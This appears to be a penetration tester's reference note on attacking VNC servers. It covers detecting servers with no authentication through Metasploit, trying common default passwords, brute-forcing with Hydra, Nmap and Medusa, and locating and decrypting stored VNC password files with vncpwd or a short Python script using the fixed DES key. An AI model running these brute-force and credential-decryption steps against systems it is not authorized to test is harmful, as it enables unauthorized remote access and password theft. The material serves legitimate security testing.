---
id: Exploitation
aliases: []
tags:
  - Networking/Services/VNC/Exploitation
---

# Exploitation

___

<!-- Authentication {{{-->
## Authentication

<!-- None Auth {{{-->
### None Auth

Test for VNC servers configured without authentication

[[Pentest/Tools/Metasploit/Metasploit]] — VNC Authentication None Detection
(*[vnc_none_auth](https://www.rapid7.com/db/modules/auxiliary/scanner/vnc/vnc_none_auth/)*)

```sh
msf> use auxiliary/scanner/vnc/vnc_none_auth
```

<!-- Example {{{-->
> [!example]-
>
> Detect VNC servers that support the `None` authentication method
>
> ```sh
> msf > use auxiliary/scanner/vnc/vnc_none_auth
> ```
> ```sh
> msf auxiliary(vnc_none_auth) > show actions
> ```
> ```sh
> msf auxiliary(vnc_none_auth) > set ACTION < action-name >
> ```
> ```sh
> msf auxiliary(vnc_none_auth) > show options
> ```
> ```sh
> msf auxiliary(vnc_none_auth) > run
> ```
<!-- }}} -->

[vncviewer](https://www.realvnc.com/en/connect/download/viewer/)

```sh
vncviewer $target:5900
```

<!-- }}} -->

<!-- Default Credentials {{{-->
### Default Credentials

Test common default VNC passwords for unauthorized access

Common VNC passwords

```sh
password
12345678
vnc123
admin
administrator
```

[vncviewer](https://www.realvnc.com/en/connect/download/viewer/) —
Connect and enter password when prompted

```sh
vncviewer $target:5900
```
<!-- }}} -->

<!-- Brute Force {{{-->
### Brute Force

<!-- Wordlist {{{-->
> [!tip]- Wordlist
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> Passwords
>
> - [[SecLists#Passwords|SecLists]]
>
> ```sh
> /usr/share/wordlists/rockyou.txt
> ```
> ```sh
> /usr/share/wordlists/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt
> ```
<!-- }}} -->

[[Hydra]]

```sh
hydra -P <password_list> vnc://$target
```

[[Nmap]]

```sh
nmap $target -p 5900 --script vnc-brute --script-args passdb=<password_list> -oA vnc-scripts-brute
```

[[Medusa]]

```sh
medusa -h $target -u "" -P <password_list> -M vnc
```

<!-- }}} -->

___
<!-- }}} -->

<!-- Decrypt VNC Password {{{-->
## Decrypt VNC Password

Exploit VNC's weak password encryption for credential recovery

VNC default password locations

```sh
~/.vnc/passwd
```

```sh
C:\Users\<user>\.vnc\passwd
```

```sh
C:\Program Files\RealVNC\vncserver.ini
```

<!-- Info {{{-->
> [!info]-
>
> If the password looks encrypted, it is probably ciphered with
> [3des](https://en.wikipedia.org/wiki/Triple_DES)
<!-- }}} -->

[vncpwd](https://github.com/jeroennijhof/vncpwd) —
VNC Password Decrypter

```sh
vncpwd <vnc_password_file>
```

Using Python script

<!-- Example {{{-->
> [!example]-
>
> ```py
> python3 << 'EOF'
> from d3des import decrypt
> import base64
>
> # Read encrypted password
> with open('.vnc/passwd', 'rb') as f:
>     encrypted = f.read()
>
> # Decrypt (DES with fixed key)
> key = [0x17, 0x52, 0x6b, 0x06, 0x23, 0x4e, 0x58, 0x07]
> password = decrypt(encrypted, key)
> print(password)
> EOF
> ```
<!-- }}} -->

___
<!-- }}} -->
